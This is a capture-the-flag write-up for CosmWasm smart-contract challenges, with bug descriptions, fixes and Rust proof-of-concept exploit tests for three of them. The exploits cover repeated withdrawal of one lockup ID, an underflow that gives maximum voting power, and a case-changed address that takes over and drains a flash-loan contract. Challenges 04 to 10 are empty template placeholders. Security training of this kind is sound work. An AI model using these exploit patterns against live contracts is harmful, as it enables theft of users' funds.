# Solutions to the CTF

## Challenge 01: *Mjolnir*

### Description

Hello guys my name is Jess I am a security researcher mostly in the area of Windows binary exploitation.
I think the issue in this challenge, is that in the withdraw() function in contract.rs, on L#94, you can
claim multiple times for the same ID. You could fix this by keeping a list of unlocked lockup ids, and
return Err if this list contains the lockup.id

(I think there are also some fancy slice tricks which you could use to deduplicate vec entries without
adding an extra mem allocation, but don't think is stabilized yet, just in nightly; also this way makes
the developer's intention clear)

Incidentally this is kind of reminescent of the Mirror exploit from the halcyon days of 2021 :)
  
### Recommendation

error.rs:
```rust
#[derive(Error, Debug)]
pub enum ContractError {
    #[error("{0}")]
    Std(#[from] StdError),

    #[error("Unauthorized")]
    Unauthorized {},

    #[error("Duplicate Position")]
    DuplicatePosition {},
}
```

contract.rs:
```rust
    let mut unlocked_ids: Vec<Uint128> = vec![];
    for lockup in lockups {
        // validate owner and time
        if lockup.owner != info.sender || env.block.time < lockup.release_timestamp {
            return Err(ContractError::Unauthorized {});
        }

        // validate position lockup
        if unlocked_ids.contains(lockup.id) {
            return Err(ContractError::DuplicatePosition {});
        }
        // push lockup id
        unlocked_ids.push(lockup.id);

        // increase total amount
        total_amount += lockup.amount;

        // remove from storage
        LOCKUPS.remove(deps.storage, lockup.id);
    }
```

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // test withdraw
        // claim for the same id repeatedly
        let msg = ExecuteMsg::Withdraw { ids: vec![1,1,1,1,1,1,1,1,1,1] };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // verify funds received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        // contract was funded with 10 deposit_amount
        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10));
    }
```

---

## Challenge 02: *Gungnir*

### Description

One mistake people make surprisingly often is to assume that Rust guards against integer underflow/overflow.
The result of an arithmetic operation in Rust *can not be undefined* due to its strict type semantics.
So the compiler will perform static checks, but can't assume the result of addition or subtraction at runtime.
Any additional runtime checks which rustc would add incur additional overhead, so they must be made explicit
in Cargo.toml if you want to advantage of them. This is an understandable oversight especially for developers
coming from the world of Solidity smart contracts (where type safety and optimization are sometimes not a priority).


I observe first of all that this is the release profile in Cargo.toml (note the last setting particularly)
[this is the default for release profile, as well](https://doc.rust-lang.org/cargo/reference/profiles.html)
```
[profile.release]
opt-level = 3
debug = false
rpath = false
lto = true
debug-assertions = false
codegen-units = 1
panic = 'abort'
incremental = false
overflow-checks = false
```

And next I see that unstake does not check the unlock_amount (which is arbitrary user input) against the
user.total_tokens:
```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power -= unlock_amount;
```

Thus you can violate the program invariant that stake < total tokens, which is assumed here on L#105:
    // cannot stake more than total tokens
We can fix this by adding additional sanity checks! Or we can use checked_sub instead of -=. Or both!

[Here](https://www.sec3.dev/blog/understanding-arithmetic-overflow-underflows-in-rust-and-solana-smart-contracts) is a blog from the fine folks at sec3 about the issue. It mostly concerns solana programs, but the
same idea applies here for cosmwasm!


### Recommendation

```rust
/// Entry point for users to decrease voting power
pub fn unstake(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    unlock_amount: u128,
) -> Result<Response, ContractError> {
    // decrease voting power
    let mut user = VOTING_POWER.load(deps.storage, &info.sender).unwrap();

    // check release time
    if env.block.time < user.released_time {
        return Err(ContractError::Unauthorized {});
    }

    // cannot UNstake more than total tokens
    if unlock_amount > user.total_tokens.u128() {
        return Err(ContractError::Unauthorized {});
    }

    user.voting_power = user.voting_power.checked_sub(unlock_amount);

    VOTING_POWER
        .save(deps.storage, &info.sender, &user)
        .unwrap();

    Ok(Response::new()
        .add_attribute("action", "unstake")
        .add_attribute("unlock_amount", unlock_amount.to_string())
        .add_attribute("user.voting_power", user.voting_power.to_string()))
}
```
And maybe change the release profile to be overflow-checks = true if we don't mind the overhead

### Proof of concept
Tests can give people a false sense of confidence. If your test does not reflect the release environment,
its results may not catch bugs which surface in production

If we run this with cargo's default test profile (ie with debug assertions enabled and optimizations disabled),
it will fail. However, if we run it with cargo test --release then it will pass:

```rust
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        let sender = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // no funds left
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // query user
        let msg = QueryMsg::GetUser {
            user: (&USER).to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, amount);

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // evil unstake
        let msg = ExecuteMsg::Unstake {
            // -1 should give us u128::MAX voting_power
            unlock_amount: amount.u128() + 1,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // hella voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, u128::MAX);
    }
```

---

## Challenge 03: *Laevateinn*

### Description

Issue:
I am not such the cosmwasm expert. I have more experience with the cosmos go sdk, (and substrate as far as rust stuff goes).
So I had to RTFM a little about how contract state is handled in cosmwasm, because I saw that addresses are being deserialized from
the Addr type rather than an Option<String>, *even though the attacker can pass an arbitrary input*. This seemed potentially unsafe to me.
Sure enough, I came across [this info](https://book.cosmwasm.com/basics/state.html)

"First, we need to transform the vector of strings into the vector of addresses to be stored.
We cannot take addresses as a message argument because not every string is a valid address.

Every string can be technically considered an address. However, not every string is an actual existing blockchain address.
When we keep anything of type Addr in the contract, we assume it is a proper address in the blockchain.
That is why the addr_validate function exits - to check this precondition."

addr_validate is not used, and Addr is consumed as an argument.
I observed this in contract.rs of the proxy contract; this is the function that users call to request a flash loan:
```rust
/// Entry point for user to request flash loan
pub fn request_flash_loan(
    deps: DepsMut,
    env: Env,
    _info: MessageInfo,
    recipient: Addr,
    msg: Binary,
)
```

Indeed recipient is passed in as an Addr, but it's not validated to be an address! There is only some cursory sanity checking done to
(attempt to) check that the "recipient" parameter is not the flash loan contract:
```rust
    // Disallow calling flash loan addr
    if recipient == config.flash_loan_addr {
        return Err(ContractError::CallToFlashLoan {});
    }
```
However, it's only checking that these two strings are equivalent! I recalled as well that cosmos addresses *are not case sensitive*.
Cosmos use Bech32. So the simplest way to bypass this minimal check is by simply using an uppercase string.

Secondly, I observed that the attacker also has control of the msg parameter. This is used to execute a msg of the "recipient" in the context of
the proxy contract, in ctf-03/contracts/proxy/src/contract.rs in request_flash_loan():
```rust
    msgs.push(CosmosMsg::Wasm(WasmMsg::Execute {
        contract_addr: recipient.to_string(),
        msg,
        funds: vec![flash_loan_balance],
    }));
```

So we can execute an arbitrary message of an arbitrary contract, yes including the flash loan contract. So we just change its ownership to
be the "mock_arb" contract (unpriv user) and then call the withdraw_funds to drain the funds (ie capture the flag :P)

### Recommendation

The proxy contract and all other contracts should use an Option<String> as a function argument, instead of passing Addr directly.
And then the type should be validated in the function with something like:
let recipientaddr = msg.addr.map(|recipient| deps.api.addr_validate(&recipient)).transpose()?;

Additionally, for improved safety, I think that request_flash_loan() should not permit users to pass in an arbitrary message. Instead,
you could have a standard interface that all flashloan receivers are expected to implement (just thinking of how Balancer or Aave does it)

Also, it would probably be safer if the flashloan receiver were also the info.sender, although this limits composability.

### Proof of concept

```rust
    #[test]
    fn exploit() {
        let (mut app, proxy_contract, flash_loan_contract, _mock_arb_contract) =
            proper_instantiate();

        // prepare transfer ownership message
        let pwn_msg = to_binary(&FlashLoanExecuteMsg::TransferOwner {
            new_owner: Addr::unchecked(CONTRACT2),
        })
        .unwrap();

        // evade the minimal sanity checking in proxy.rs
        // (cosmos addresses aren't case-sensitive)
        let wat: &str = r#"CONTRACT0"#;

        // direct control flow to flashloan contract instead of arb contract
        app.execute_contract(
            Addr::unchecked(ADMIN),
            proxy_contract,
            &ExecuteMsg::RequestFlashLoan {
                recipient: Addr::unchecked(wat),
                msg: pwn_msg,
            },
            &[],
        )
        .unwrap();

        // drain funds
        app.execute_contract(
            Addr::unchecked(CONTRACT2),
            flash_loan_contract.clone(),
            &FlashLoanExecuteMsg::WithdrawFunds {
                recipient: Addr::unchecked(CONTRACT2),
            },
            &[],
        )
        .unwrap();

        // funds are drained, flash contract rekt
        let balance = app
            .wrap()
            .query_balance(CONTRACT2, DENOM)
            .unwrap();
        assert_eq!(balance.amount, Uint128::new(10_000));
    }
```

---

## Challenge 04: *Gram*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: *Draupnir*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 06: *Hofund*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 07: *Tyrfing*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 08: *Gjallarhorn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 09: *Brisingamen*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```

---

## Challenge 10: *Mistilteinn*

### Description

The bug occurs in ...

### Recommendation

The fix should be ...

### Proof of concept

```rust
// code goes here
```
